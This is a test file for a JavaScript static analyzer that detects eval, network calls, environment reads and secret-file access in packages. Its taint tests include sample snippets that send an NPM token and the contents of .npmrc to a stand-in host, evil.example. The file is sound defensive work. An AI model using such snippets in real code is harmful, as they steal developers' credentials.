// SPDX-License-Identifier: MIT
import { describe, expect, test } from "bun:test";
import { analyzeSource, foldString } from "../src/ast/analyzer";
import { Parser } from "acorn";

function parseExpr(src: string): unknown {
  // wrap in parens so Acorn parses the leading `{` correctly
  const ast = Parser.parse(`(${src})`, { ecmaVersion: 2024, sourceType: "script" }) as {
    body: Array<{ type: string; expression?: unknown }>;
  };
  const stmt = ast.body[0];
  return stmt && stmt.type === "ExpressionStatement" ? stmt.expression : null;
}

describe("AST: foldString", () => {
  test("folds a literal string", () => {
    expect(foldString(parseExpr(`"hello"`) as never)).toBe("hello");
  });
  test("folds string concatenation", () => {
    expect(foldString(parseExpr(`'ht' + 'tp' + 's'`) as never)).toBe("https");
  });
  test("folds template literals", () => {
    expect(foldString(parseExpr("`abc${'de'}f`") as never)).toBe("abcdef");
  });
  test("returns null for non-string expressions", () => {
    expect(foldString(parseExpr(`x + 'y'`) as never)).toBeNull();
  });
  test("does not infinite-recurse on deep nesting", () => {
    // 30 levels of 'a' + 'a' + ...
    let s = "'a'";
    for (let i = 0; i < 30; i++) s = `(${s} + 'a')`;
    // foldString depth-limit is 24; this should bail to null without throwing
    const r = foldString(parseExpr(s) as never);
    // Either folded fully or null is acceptable; importantly: no exception.
    expect(r === null || typeof r === "string").toBe(true);
  });
});

describe("AST: simple direct calls", () => {
  test("flags require('https')", () => {
    const r = analyzeSource("inline.js", `const h = require('https'); h.get('https://x');`);
    expect(r.parseFallback).toBe(false);
    expect(r.hits.some((h) => h.category === "network-builtin")).toBe(true);
  });
  test("flags eval()", () => {
    const r = analyzeSource("inline.js", `eval("1+1")`);
    expect(r.hits.some((h) => h.category === "eval")).toBe(true);
  });
  test("flags new Function('...')", () => {
    const r = analyzeSource("inline.js", `new Function('return 1')()`);
    expect(r.hits.some((h) => h.category === "eval")).toBe(true);
  });
  test("flags fetch()", () => {
    const r = analyzeSource("inline.js", `fetch('https://x')`);
    expect(r.hits.some((h) => h.category === "fetch")).toBe(true);
  });
  test("flags child_process.exec via destructured alias", () => {
    const r = analyzeSource(
      "inline.js",
      `const { exec } = require('child_process'); exec('ls')`,
    );
    expect(r.hits.some((h) => h.category === "child-process")).toBe(true);
  });
  test("flags process.env access", () => {
    const r = analyzeSource("inline.js", `console.log(process.env.NPM_TOKEN)`);
    expect(r.hits.some((h) => h.category === "env-read")).toBe(true);
  });
  test("flags secret-path string literals", () => {
    const r = analyzeSource("inline.js", `const p = "/home/x/.npmrc"; require('fs').readFile(p)`);
    expect(r.hits.some((h) => h.category === "secret-path")).toBe(true);
  });
});

describe("AST: anti-evasion (this is the response to the critique #1)", () => {
  test("string concat does NOT bypass require() detection", () => {
    const r = analyzeSource("inline.js", `require('ht' + 'tps').get('x')`);
    expect(r.hits.some((h) => h.category === "network-builtin")).toBe(true);
  });
  test("template literal does NOT bypass require() detection", () => {
    const r = analyzeSource("inline.js", "require(`ht${''}tps`).get('x')");
    expect(r.hits.some((h) => h.category === "network-builtin")).toBe(true);
  });
  test("dynamic require with non-literal arg is still flagged (as dynamic-require)", () => {
    const r = analyzeSource("inline.js", `const m = process.env.M; require(m)`);
    expect(r.hits.some((h) => h.category === "dynamic-require")).toBe(true);
  });
  test("Buffer.from(literal,'base64') is flagged AND decoded literal re-scanned for secret-path", () => {
    // Base64 of "/home/x/.npmrc" → L2hvbWUveC8ubnBtcmM=
    const lit = Buffer.from("/home/x/.npmrc").toString("base64");
    const r = analyzeSource("inline.js", `Buffer.from('${lit}','base64').toString()`);
    expect(r.hits.some((h) => h.category === "base64-decode")).toBe(true);
    expect(r.hits.some((h) => h.category === "secret-path")).toBe(true);
  });
  test("atob('literal') is flagged", () => {
    const lit = Buffer.from("hello-world").toString("base64");
    const r = analyzeSource("inline.js", `atob('${lit}')`);
    expect(r.hits.some((h) => h.category === "base64-decode")).toBe(true);
  });
  test("vm.runInNewContext is flagged as eval", () => {
    const r = analyzeSource("inline.js", `const vm = require('vm'); vm.runInNewContext('1+1')`);
    expect(r.hits.some((h) => h.category === "eval")).toBe(true);
  });
  test("string-concat-eval pattern is flagged", () => {
    const r = analyzeSource("inline.js", `const x = 'a'; eval(x + '+1')`);
    expect(r.hits.some((h) => h.category === "string-concat-eval")).toBe(true);
  });
  test("regex-fallback when source is unparseable still detects critical patterns", () => {
    const broken = `this is { not valid javascript ;; eval('x'); fetch('y')`;
    const r = analyzeSource("inline.js", broken);
    expect(r.parseFallback).toBe(true);
    expect(r.hits.some((h) => h.category === "eval")).toBe(true);
    expect(r.hits.some((h) => h.category === "fetch")).toBe(true);
  });
});

describe("AST: taint approximation source -> sink", () => {
  test("env-read followed by fetch sets taintToSink", () => {
    const r = analyzeSource(
      "inline.js",
      `const tok = process.env.NPM_TOKEN; fetch('https://evil.example/x', { headers: { tok } })`,
    );
    expect(r.taintToSink).toBe(true);
    expect(r.taintSources).toContain("env-read");
    expect(r.taintSinks).toContain("fetch");
  });
  test("secret-path read followed by https.request sets taintToSink", () => {
    const src = `
      const fs = require('fs');
      const https = require('https');
      const data = fs.readFileSync('/home/x/.npmrc');
      const req = https.request({ host: 'evil.example' }); req.write(data); req.end();
    `;
    const r = analyzeSource("inline.js", src);
    expect(r.taintToSink).toBe(true);
    expect(r.taintSources).toContain("secret-path");
    expect(r.taintSinks).toContain("network-builtin");
  });
  test("env-read alone does NOT set taintToSink (no sink)", () => {
    const r = analyzeSource("inline.js", `if (process.env.PLATFORM === 'darwin') {}`);
    expect(r.taintToSink).toBe(false);
  });
  test("fetch alone does NOT set taintToSink (no source)", () => {
    const r = analyzeSource("inline.js", `fetch('https://api.example.com/healthz')`);
    expect(r.taintToSink).toBe(false);
  });
});

describe("AST: false-positive guards", () => {
  test("a benign tsc -b script does NOT trip eval/network/child-process", () => {
    // Of course this is shell, not JS, so the AST analyzer wouldn't even see it,
    // but if we accidentally feed it as a source, it should be inert.
    const r = analyzeSource("inline.js", `// nothing dangerous here\nconsole.log('hi')`);
    expect(r.hits.some((h) => h.category === "eval")).toBe(false);
    expect(r.hits.some((h) => h.category === "network-builtin")).toBe(false);
  });
  test("regular fs.readFile (no secret path) does NOT flag secret-path", () => {
    const r = analyzeSource(
      "inline.js",
      `require('fs').readFile('./build/output.js', () => {})`,
    );
    expect(r.hits.some((h) => h.category === "secret-path")).toBe(false);
  });
});
